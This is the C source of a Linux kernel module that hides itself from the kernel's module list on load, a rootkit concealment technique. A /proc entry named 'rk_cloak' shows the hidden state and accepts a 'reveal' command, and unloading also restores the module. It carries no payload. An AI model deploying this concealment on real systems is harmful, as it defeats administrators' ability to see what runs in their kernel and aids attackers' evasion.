// SPDX-License-Identifier: GPL-2.0
#include <linux/init.h>
#include <linux/list.h>
#include <linux/module.h>
#include <linux/mutex.h>
#include <linux/proc_fs.h>
#include <linux/seq_file.h>
#include <linux/uaccess.h>

#define COMMAND_SIZE 16

static struct list_head *module_previous;
static struct proc_dir_entry *control_entry;
static bool hidden;
static DEFINE_MUTEX(cloak_lock);

static void hide_module(void)
{
	if (hidden)
		return;
	module_previous = THIS_MODULE->list.prev;
	list_del_init(&THIS_MODULE->list);
	hidden = true;
}

static void reveal_module(void)
{
	if (!hidden)
		return;
	list_add(&THIS_MODULE->list, module_previous);
	hidden = false;
}

static int status_show(struct seq_file *output, void *unused)
{
	mutex_lock(&cloak_lock);
	seq_printf(output, "hidden=%s\n", hidden ? "yes" : "no");
	mutex_unlock(&cloak_lock);
	return 0;
}

static int status_open(struct inode *inode, struct file *file)
{
	return single_open(file, status_show, NULL);
}

static ssize_t control_write(struct file *file, const char __user *buffer,
			     size_t count, loff_t *position)
{
	char command[COMMAND_SIZE];
	size_t length = count;

	if (!count || count >= sizeof(command))
		return -EINVAL;
	if (copy_from_user(command, buffer, count))
		return -EFAULT;
	if (memchr(command, '\0', count))
		return -EINVAL;
	if (command[length - 1] == '\n')
		length--;
	command[length] = '\0';
	if (strcmp(command, "reveal"))
		return -EINVAL;
	mutex_lock(&cloak_lock);
	reveal_module();
	mutex_unlock(&cloak_lock);
	return count;
}

static const struct proc_ops control_ops = {
	.proc_open = status_open,
	.proc_read = seq_read,
	.proc_lseek = seq_lseek,
	.proc_release = single_release,
	.proc_write = control_write,
};

static int __init conceal_init(void)
{
	control_entry = proc_create("rk_cloak", 0600, NULL, &control_ops);
	if (!control_entry)
		return -ENOMEM;
	mutex_lock(&cloak_lock);
	hide_module();
	mutex_unlock(&cloak_lock);
	return 0;
}

static void __exit conceal_exit(void)
{
	proc_remove(control_entry);
	mutex_lock(&cloak_lock);
	reveal_module();
	mutex_unlock(&cloak_lock);
}

module_init(conceal_init);
module_exit(conceal_exit);
MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Reversible module-list concealment");
